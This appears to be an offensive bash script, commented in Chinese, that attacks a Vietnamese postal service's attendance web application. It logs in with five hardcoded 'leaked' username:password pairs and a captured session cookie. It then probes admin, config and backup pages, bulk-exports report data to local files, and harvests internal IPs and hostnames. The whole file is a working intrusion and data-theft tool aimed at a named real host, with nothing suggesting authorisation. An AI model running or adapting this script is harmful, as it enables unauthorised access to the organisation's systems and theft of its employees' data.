#!/bin/bash

COOKIE_BASE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最后的希望：所有账号+数据窃取"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击1] 测试所有5个泄露账号"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ACCOUNTS=(
    "KVMBTCVP:123"      # 已知可登录
    "KVMBTCKT:123"
    "KVMTBDVP:123"
    "KVMTNVKS:123"
    "KVMTVCGN:234"
)

for account in "${ACCOUNTS[@]}"; do
    IFS=':' read user pass <<< "$account"
    echo ""
    echo "  ━━━ 测试账号: $user:$pass ━━━"
    
    # 获取登录页面
    login_page=$(curl -sk "${BASE}/login.aspx" 2>&1)
    VS=$(echo "$login_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$login_page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$login_page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # 登录
    login_resp=$(curl -sk "${BASE}/login.aspx" \
        -X POST \
        -c "cookie_${user}.txt" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "tUser=$user" \
        --data-urlencode "tPass=$pass" \
        --data-urlencode "tOk=Đăng nhập" \
        -L 2>&1)
    
    # 检查登录成功
    if echo "$login_resp" | grep -qi "top.aspx\|leftmenu\|logout"; then
        echo "    ✅ 登录成功！"
        
        # 获取Session ID
        session=$(grep "ASP.NET_SessionId" "cookie_${user}.txt" | awk '{print $7}')
        echo "    Session: $session"
        
        # 获取菜单
        menu=$(curl -sk "${BASE}/leftmenu.aspx" -b "cookie_${user}.txt" 2>&1)
        menu_size=$(echo "$menu" | wc -c)
        echo "    菜单大小: $menu_size bytes"
        
        # 检查权限
        if echo "$menu" | grep -qi "admin\|quản trị\|system\|hệ thống"; then
            echo "    🔥🔥🔥🔥🔥 管理员账号！"
            echo "$menu" | grep -i "admin\|quản trị" | head -10
        fi
        
        # 提取所有功能
        echo "$menu" | grep -oE "href=['\"]([^'\"]+\.aspx[^'\"]*)" | \
            sed 's/href=["'\'']//' | sort -u > "menu_${user}_functions.txt"
        
        func_count=$(wc -l < "menu_${user}_functions.txt" 2>/dev/null || echo 0)
        echo "    功能数: $func_count"
        
        # 测试特权功能
        echo ""
        echo "    测试特权功能..."
        
        PRIV_FUNCS=(
            "/chamcong/admin/default.aspx"
            "/chamcong/system/config.aspx"
            "/chamcong/user/manage.aspx"
            "/chamcong/backup/export.aspx"
        )
        
        for func in "${PRIV_FUNCS[@]}"; do
            resp=$(curl -sk "http://vps.vnpost.vn${func}" \
                -b "cookie_${user}.txt" \
                -w "%{http_code}" \
                -o "priv_${user}_$(basename $func).html" 2>&1)
            
            http_code=$(echo "$resp" | tail -c 4)
            
            if [ "$http_code" == "200" ]; then
                size=$(wc -c < "priv_${user}_$(basename $func).html")
                if [ $size -gt 3000 ]; then
                    echo "      🔥 $func: $http_code ($size bytes)"
                fi
            fi
        done
        
        # 保存cookie给后续使用
        echo "    Cookie已保存: cookie_${user}.txt"
        
    else
        echo "    ❌ 登录失败"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击2] 通过报表功能窃取数据"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 使用已登录的账号
COOKIE="ASP.NET_SessionId=$(grep "ASP.NET_SessionId" cookie_KVMBTCVP.txt 2>/dev/null | awk '{print $7}' || echo $COOKIE_BASE)"

echo "  尝试导出所有报表数据..."
echo ""

# 测试所有已知的报表ID
REPORT_IDS=("BC01" "BC02" "BC03" "MAU2" "MAU5")

for id in "${REPORT_IDS[@]}"; do
    echo "  报表 $id:"
    
    # 获取ViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # 正常导出（看能否获取数据）
    curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "data_export_${id}.html" 2>&1
    
    size=$(wc -c < "data_export_${id}.html")
    echo "    导出大小: $size bytes"
    
    # 检查是否有实际数据
    if [ $size -gt 10000 ]; then
        echo "    🔥 可能包含数据！"
        
        # 查找表格/数据
        if grep -qi "<table\|<tr>\|<td>" "data_export_${id}.html"; then
            echo "    🔥 发现表格数据"
            grep -A 2 "<td>" "data_export_${id}.html" | head -20
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[攻击3] 尝试通过合法功能获取内网信息"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  策略：通过页面源码、错误信息等获取内网IP/主机名"
echo ""

# 访问各种页面收集信息
PAGES=(
    "/chamcong/index.aspx"
    "/chamcong/top.aspx"
    "/chamcong/leftmenu.aspx"
    "/chamcong/report/inBCC.aspx?ID=BC01"
)

echo "  提取的内网信息:"
for page_path in "${PAGES[@]}"; do
    curl -sk "http://vps.vnpost.vn${page_path}" -H "Cookie: $COOKIE" 2>&1 | \
        grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}|\\\\\\\\[A-Za-z0-9-]+|[A-Za-z0-9-]+\.local|[A-Za-z0-9-]+\.internal" | \
        sort -u
done | sort -u | while read info; do
    if [[ ! "$info" =~ ^(127\.0\.0\.1|0\.0\.0\.0|255\.255\.255\.) ]]; then
        echo "    🔥 $info"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 最后攻击完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 总结:"
echo ""

# 统计成功登录的账号
echo "  成功登录的账号:"
for account in "${ACCOUNTS[@]}"; do
    IFS=':' read user pass <<< "$account"
    if [ -f "cookie_${user}.txt" ]; then
        size=$(wc -c < "cookie_${user}.txt")
        if [ $size -gt 100 ]; then
            echo "    ✅ $user:$pass"
            
            # 显示功能数
            if [ -f "menu_${user}_functions.txt" ]; then
                func_count=$(wc -l < "menu_${user}_functions.txt")
                echo "       功能数: $func_count"
            fi
        fi
    fi
done

echo ""
echo "  导出的数据:"
for file in data_export_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -gt 10000 ]; then
            echo "    🔥 $file: $size bytes"
        fi
    fi
done
